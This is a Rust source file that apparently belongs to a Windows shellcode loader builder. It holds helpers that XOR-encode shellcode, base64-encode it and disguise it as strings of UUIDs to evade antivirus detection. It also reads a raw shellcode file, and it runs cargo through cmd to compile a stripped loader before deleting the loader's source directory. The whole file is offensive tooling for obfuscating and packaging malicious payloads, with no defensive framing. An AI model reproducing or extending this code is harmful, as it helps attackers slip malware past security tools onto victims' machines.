#![feature(array_chunks)]
use std::fs::read;
use std::fs::remove_dir_all;
use std::process::Command;
use uuid::Uuid;

pub const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
pub const RANDOM_AES_KEY: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
pub const PASSWORD_LEN: usize = 10;
pub const AES_PASSWORD_LEN: usize = 16;

pub fn xor_fn(shellcode: Vec<u8>, xor: u8) -> Vec<u8> {
    let mut xor_shellcode: Vec<u8> = vec![];
    for i in shellcode.iter() {
        xor_shellcode.push(i ^ xor)
    }
    xor_shellcode
}

pub fn complie() {
    let _ = Command::new("cmd")
    .arg("/c")
    .arg("cd loader && cargo build -Z build-std=std,panic_abort -Z build-std-features=panic_immediate_abort -Z unstable-options --out-dir ../ --target x86_64-pc-windows-msvc  --release")
    .output()
    .expect("Loader make fail!");

    let _ = remove_dir_all("loader");
}

pub fn base64_encode(shellcode: Vec<u8>) -> String {
    base64::encode_config(shellcode, base64::STANDARD_NO_PAD)
}
pub fn base64_encode_str(shellcode: String) -> String {
    base64::encode_config(shellcode, base64::STANDARD_NO_PAD)
}

pub fn uuid_base64(shellcode: Vec<u8>) -> String {
    let mut real: String = String::from("");
    let mut slice = shellcode.clone();
    let front = slice.array_chunks_mut::<16>();

    let mut slice2 = shellcode.clone();
    let tail = slice2.array_chunks_mut::<16>().into_remainder();

    for i in front {
        //println!(r#""{}","#,Uuid::from_bytes_le(i.clone()));
        real = real + &Uuid::from_bytes_le(i.clone()).to_string() + ",";
    }

    let mut temp: [u8; 16] = [0; 16];
    let mut k = 0;
    for i in tail.iter() {
        temp[k] = i.clone();
        k = k + 1;
    }

    real = real + &Uuid::from_bytes_le(temp).to_string();

    base64_encode_str(real.clone())
}

pub fn read_file(filename: String) -> Vec<u8> {
    let shellcode = match read(filename) {
        Ok(res) => res,
        Err(err) => {
            println!("{}", err);
            let _ = remove_dir_all("loader");
            std::process::exit(1);
        }
    };
    shellcode
}
